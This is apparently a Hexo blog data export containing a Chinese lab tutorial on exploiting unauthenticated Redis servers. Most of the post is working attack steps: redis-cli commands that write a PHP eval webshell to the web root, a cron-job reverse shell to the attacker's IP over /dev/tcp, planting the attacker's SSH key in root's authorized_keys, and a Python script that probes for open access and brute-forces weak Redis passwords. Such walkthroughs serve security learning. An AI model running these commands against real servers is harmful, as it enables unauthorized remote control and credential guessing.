{"meta":{"title":"浅笑996的博客","subtitle":"","description":"","author":"qianxiao996","url":"http://blog.qianxiao996.cn","root":"/"},"pages":[{"title":"分類","date":"2018-01-04T16:00:00.000Z","updated":"2020-10-10T03:23:40.875Z","comments":true,"path":"categories/index.html","permalink":"http://blog.qianxiao996.cn/categories/index.html","excerpt":"","text":""},{"title":"友情鏈接","date":"2018-06-07T14:17:49.000Z","updated":"2020-10-10T03:23:58.049Z","comments":true,"path":"link/index.html","permalink":"http://blog.qianxiao996.cn/link/index.html","excerpt":"","text":""},{"title":"关于","date":"2020-10-10T03:27:43.298Z","updated":"2020-10-10T03:27:43.298Z","comments":false,"path":"about/index.html","permalink":"http://blog.qianxiao996.cn/about/index.html","excerpt":"","text":"qianxiao996一个网络小白"},{"title":"標籤","date":"2018-01-04T16:00:00.000Z","updated":"2020-10-10T03:22:49.172Z","comments":true,"path":"tags/index.html","permalink":"http://blog.qianxiao996.cn/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Redis未授权访问","slug":"Redis未授权访问","date":"2019-01-05T02:23:45.000Z","updated":"2020-10-10T04:36:39.513Z","comments":true,"path":"2019/01/05/Redis未授权访问/","link":"","permalink":"http://blog.qianxiao996.cn/2019/01/05/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/","excerpt":"","text":"Redis未授权访问0x01、服务简介REmote DIctionary Server(Redis) 是一个由Salvatore Sanfilippo写的key-value存储系统。Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。Redis默认监听端口为63790x02、环境搭建攻击机及受害机都需要安装rediscentos安装redis1234567wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-4.0.2.tar.gztar xzf redis-4.0.2.tar.gzcd redis-4.0.2make&#x2F;&#x2F;全局生效 cp src&#x2F;redis-cli &#x2F;usr&#x2F;bin&#x2F;cp src&#x2F;redis-server &#x2F;usr&#x2F;bin&#x2F;受害机编辑配置文件，去掉端口绑定，关闭安全模式，允许公网访问。1vi redis.conf运行命令启动redis1[root@localhost redis-4.0.2]# redis-server redis.confkali安装redis下载redis1wget http:&#x2F;&#x2F;download.redis.io&#x2F;redis-stable.tar.gz解压缩1tar -zxvf redis-stable.tar.gz简易配置12345cd redis-stable make &#x2F;&#x2F;全局生效 cp src&#x2F;redis-cli &#x2F;usr&#x2F;bin&#x2F;cp src&#x2F;redis-server &#x2F;usr&#x2F;bin&#x2F;常规连接指令1redis-cli -h 目标主机IP地址 -p 端口号0x03、数据操作Redis删除数据1234info 查看信息KEYS * 显示所有keydel key 删除键为key的数据flushall 删除所有key扫描一下端口是开放的攻击机连接redis1redis-cli -h 192.168.126.133 -p 6379这样就代表连接成功了0x04、利用Redis写入Webshell启动http。php、mysql安装过程略1service httpd start攻击机执行命令12345678910#利用Redis写入Webshell192.168.126.133:6379&gt; config set dir &#x2F;var&#x2F;www&#x2F;html&#x2F;OK192.168.126.133:6379&gt; config set dbfilename cmd.phpOK192.168.126.133:6379&gt; set webshell &quot;\\r\\n\\r\\n&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;\\r\\n\\r\\n&quot;OK192.168.126.133:6379&gt; saveOK192.168.126.133:6379&gt;我们去受害机看一下，可以看到成功写入文件，可以看到能正常执行代码0x05、计划任务反弹shell该功能在Ubuntu/Debian上不能使用。因为ubuntu定时任务的文件权限必须为600。而redis的写入文件的权限为644。并且由于redis写入文件时会添加上redis版本等内容，所以在ubuntu/debian中会因语法错误而报错忽略：(root) ERROR (Syntax error, this crontab file will be ignored)但在centos是可以执行的。攻击机监听端口1nc -lvvp 6666123456789#计划任务反弹shell192.168.126.133:6379&gt; set cmd &quot;\\n\\n* * * * * &#x2F;bin&#x2F;bash -i&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;192.168.126.130&#x2F;6666 0&gt;&amp;1\\n\\n&quot;OK192.168.126.133:6379&gt; config set dir &#x2F;var&#x2F;spool&#x2F;cronOK192.168.126.133:6379&gt; config set dbfilename rootOK192.168.126.133:6379&gt; saveOK注意：ubuntu的计划任务目录在/var/spool/cron/crontabs而centos在/var/spool/cron/成功返回shellUbuntu计划任务不执行排查!!!注意：此漏洞ubuntu不能用计划任务反弹shell参考文章：https://www.phpyuan.com/266120.html首先去开启cron日志12vim &#x2F;etc&#x2F;rsyslog.d&#x2F;50-default.conf#cron.*前的#删掉；cron日志路径 /var/log/cron.log通过查看发现错误这个的意思是错误发送给邮件服务器了，而邮件没有安装，我们安装邮件服务器1apt install postfix安装完之后cron出错误会发送给你邮件通过百度得出 sh软链接的是dash。而不是bash解决办法将sh直接改了，直接指向/bin/bash12rm -f &#x2F;bin&#x2F;sh;ln -sf &#x2F;bin&#x2F;bash &#x2F;bin&#x2F;sh弹回来了。0x06、ssh免密登录此功能需要root权限启用redis，对目录可写才可以。1、生成ssh key攻击方生成ssh key1root@kali:~# ssh-keygen -t rsa生成的key在/root/.ssh目录下，id_rsa.pub为公钥。id_rsa为私钥2、将公钥写入文件将之前生成的公钥写入文件中Bash12cd ~/.ssh/(echo -e \"\\n\\n\"; cat id_rsa.pub; echo -e \"\\n\\n\")&gt; hack.txt3、将文件写入靶机将hack.txt写入靶机RedisBash1cat hack.txt | redis-cli -h 192.168.126.133 -x set crack4、写入公钥将公钥写入redis服务器的authorized_keys中1234567root@kali:~&#x2F;.ssh# redis-cli -h 192.168.126.133 -p 6379 192.168.126.133:6379&gt; config set dir &#x2F;root&#x2F;.ssh&#x2F;OK192.168.126.133:6379&gt; config set dbfilename &quot;authorized_keys&quot;OK192.168.126.133:6379&gt; saveOK回到受害机看一下文件是否存在此处有个坑。centos需要开启公钥登录开启公钥登录修改文件1# vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config开启公钥登录12345#开启秘钥登录RSAAuthentication yes PubkeyAuthentication yes AuthorizedKeysFile .ssh&#x2F;authorized_keysPermitRootLogin yes还有一个大坑。这时候仍然有可能无法使用ssh登录。我们调试一下123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596ssh -i id_rsa root@192.168.126.133 -vvOpenSSH_7.9p1 Debian-10, OpenSSL 1.1.1b 26 Feb 2019debug1: Reading configuration data &#x2F;etc&#x2F;ssh&#x2F;ssh_configdebug1: &#x2F;etc&#x2F;ssh&#x2F;ssh_config line 19: Applying options for *debug2: resolve_canonicalize: hostname 192.168.126.133 is addressdebug2: ssh_connect_directdebug1: Connecting to 192.168.126.133 [192.168.126.133] port 22.debug1: Connection established.debug1: identity file id_rsa type 0debug1: identity file id_rsa-cert type -1debug1: Local version string SSH-2.0-OpenSSH_7.9p1 Debian-10debug1: Remote protocol version 2.0, remote software version OpenSSH_5.3debug1: match: OpenSSH_5.3 pat OpenSSH_5* compat 0x0c000002debug2: fd 3 setting O_NONBLOCKdebug1: Authenticating to 192.168.126.133:22 as &#39;root&#39;debug1: SSH2_MSG_KEXINIT sentdebug1: SSH2_MSG_KEXINIT receiveddebug2: local client KEXINIT proposaldebug2: KEX algorithms: curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-cdebug2: host key algorithms: rsa-sha2-512-cert-v01@openssh.com,rsa-sha2-256-cert-v01@openssh.com,ssh-rsa-cert-v01@openssh.com,rsa-sha2-512,rsa-sha2-256,ssh-rsa,ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521-cert-v01@openssh.com,ssh-ed25519-cert-v01@openssh.com,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,ssh-ed25519debug2: ciphers ctos: chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.comdebug2: ciphers stoc: chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.comdebug2: MACs ctos: umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1debug2: MACs stoc: umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1debug2: compression ctos: none,zlib@openssh.com,zlibdebug2: compression stoc: none,zlib@openssh.com,zlibdebug2: languages ctos: debug2: languages stoc: debug2: first_kex_follows 0 debug2: reserved 0 debug2: peer server KEXINIT proposaldebug2: KEX algorithms: diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1debug2: host key algorithms: ssh-rsa,ssh-dssdebug2: ciphers ctos: aes128-ctr,aes192-ctr,aes256-ctr,arcfour256,arcfour128,aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,aes192-cbc,aes256-cbc,arcfour,rijndael-cbc@lysator.liu.sedebug2: ciphers stoc: aes128-ctr,aes192-ctr,aes256-ctr,arcfour256,arcfour128,aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,aes192-cbc,aes256-cbc,arcfour,rijndael-cbc@lysator.liu.sedebug2: MACs ctos: hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-ripemd160,hmac-ripemd160@openssh.com,hmac-sha1-96,hmac-md5-96debug2: MACs stoc: hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-ripemd160,hmac-ripemd160@openssh.com,hmac-sha1-96,hmac-md5-96debug2: compression ctos: none,zlib@openssh.comdebug2: compression stoc: none,zlib@openssh.comdebug2: languages ctos: debug2: languages stoc: debug2: first_kex_follows 0 debug2: reserved 0 debug1: kex: algorithm: diffie-hellman-group-exchange-sha256debug1: kex: host key algorithm: ssh-rsadebug1: kex: server-&gt;client cipher: aes128-ctr MAC: umac-64@openssh.com compression: nonedebug1: kex: client-&gt;server cipher: aes128-ctr MAC: umac-64@openssh.com compression: nonedebug1: SSH2_MSG_KEX_DH_GEX_REQUEST(2048&lt;3072&lt;8192) sentdebug1: got SSH2_MSG_KEX_DH_GEX_GROUPdebug2: bits set: 1515&#x2F;3072debug1: SSH2_MSG_KEX_DH_GEX_INIT sentdebug1: got SSH2_MSG_KEX_DH_GEX_REPLYdebug1: Server host key: ssh-rsa SHA256:Dkk9Um2I6tGXRCUBwZQ9Zph1BQ&#x2F;XFepj45qGFPWcx&#x2F;cdebug1: Host &#39;192.168.126.133&#39; is known and matches the RSA host key.debug1: Found key in &#x2F;root&#x2F;.ssh&#x2F;known_hosts:1debug2: bits set: 1495&#x2F;3072debug2: set_newkeys: mode 1debug1: rekey after 4294967296 blocksdebug1: SSH2_MSG_NEWKEYS sentdebug1: expecting SSH2_MSG_NEWKEYSdebug1: SSH2_MSG_NEWKEYS receiveddebug2: set_newkeys: mode 0debug1: rekey after 4294967296 blocksdebug1: Will attempt key: id_rsa RSA SHA256:5p3FaEVpSdLNef+xxdWi64eQC1COEt18BvPekZySmt4 explicit agentdebug2: pubkey_prepare: donedebug2: service_accept: ssh-userauthdebug1: SSH2_MSG_SERVICE_ACCEPT receiveddebug1: Authentications that can continue: publickey,gssapi-keyex,gssapi-with-mic,passworddebug1: Next authentication method: gssapi-keyexdebug1: No valid Key exchange contextdebug2: we did not send a packet, disable methoddebug1: Next authentication method: gssapi-with-micdebug1: Unspecified GSS failure. Minor code may provide more informationNo Kerberos credentials available (default cache: FILE:&#x2F;tmp&#x2F;krb5cc_0)debug1: Unspecified GSS failure. Minor code may provide more informationNo Kerberos credentials available (default cache: FILE:&#x2F;tmp&#x2F;krb5cc_0)debug2: we did not send a packet, disable methoddebug1: Next authentication method: publickeydebug1: Offering public key: id_rsa RSA SHA256:5p3FaEVpSdLNef+xxdWi64eQC1COEt18BvPekZySmt4 explicit agentdebug2: we sent a publickey packet, wait for replydebug1: Authentications that can continue: publickey,gssapi-keyex,gssapi-with-mic,passworddebug2: we did not send a packet, disable methoddebug1: Next authentication method: passwordroot@192.168.126.133&#39;s password: debug2: we sent a password packet, wait for replydebug1: Authentications that can continue: publickey,gssapi-keyex,gssapi-with-mic,passwordPermission denied, please try again.root@192.168.126.133&#39;s password: debug2: we sent a password packet, wait for replydebug1: Authentications that can continue: publickey,gssapi-keyex,gssapi-with-mic,passwordPermission denied, please try again.root@192.168.126.133&#39;s password:这里的坑是centos的selinux在做怪selinuxselinux是强制访问控制的一种策略，可以指明某一个进程访问哪些资源，在传统的linux中，一切皆文件，由用户、组和权限来控制访问，在selinux中，一切皆对象，由存放在扩展属性领域的安全元素控制访问，所有文件、端口、进程都具备安全上下文selinux影响着：(1)程序访问文件(2)程序访问功能（微信）,进程本身功能，开关。查询selinux状态使用命令12getenforce 默认输出enforcing命令：getenforce #查询结果有3种状态1、enforcing #如果违反了策略，无法继续操作，表示强制2、disabled #禁止3、permissive #selinux有效，即是违法策略，依旧可以继续操作，但是会有警告,查看警告信息：cat /var/log/audit/audit.log更改selinux状态123456[root@localhost ~]# getenforceEnforcing[root@localhost ~]#vim &#x2F;etc&#x2F;sysconfig&#x2F;selinux #修改selinux&#x3D;permissive[root@localhost ~]#reboot #重启[root@localhost ~]# getenforce permissive5、ssh免密连接1ssh -i &#x2F;root&#x2F;.ssh&#x2F;id_rsa root@192.168.126.1330x07、利用工具未授权and弱口令检测12345678910111213141516171819202122232425262728#! /usr/bin/env python# _*_ coding:utf-8 _*_import socketimport sysPASSWORD_DIC=['redis','root','oracle','password','p@aaw0rd','abc123!','123456','admin']def check(ip, port, timeout): try: socket.setdefaulttimeout(timeout) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ip, int(port))) s.send(\"INFO\\r\\n\") result = s.recv(1024) if \"redis_version\" in result: return u\"未授权访问\" elif \"Authentication\" in result: for pass_ in PASSWORD_DIC: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ip, int(port))) s.send(\"AUTH %s\\r\\n\" %(pass_)) result = s.recv(1024) if '+OK' in result: return u\"存在弱口令，密码：%s\" % (pass_) except Exception, e: passif __name__ == '__main__': ip=sys.argv[1] port=sys.argv[2] print check(ip,port, timeout=10)github利用工具：https://github.com/Ridter/redis-rcehttps://github.com/n0b0dyCN/redis-rogue-server","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://blog.qianxiao996.cn/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"未授权访问","slug":"未授权访问","permalink":"http://blog.qianxiao996.cn/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"}]}],"categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://blog.qianxiao996.cn/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"未授权访问","slug":"未授权访问","permalink":"http://blog.qianxiao996.cn/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"}]}